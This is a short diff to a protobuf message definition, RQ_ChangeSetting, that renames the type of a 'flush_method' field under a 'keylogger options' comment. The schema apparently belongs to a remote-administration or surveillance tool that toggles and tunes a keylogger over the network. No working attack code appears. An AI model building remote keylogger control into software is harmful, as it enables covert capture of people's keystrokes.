@@ -7,7 +7,7 @@ import "net/misc/Misc.proto";
 message RQ_ChangeSetting {
 
 	// keylogger options
-	optional FLUSH_METHOD flush_method = 1;
+	optional Trigger flush_method = 1;
 	optional int32 flush_value = 2;
 	optional State keylogger_state = 3;
 
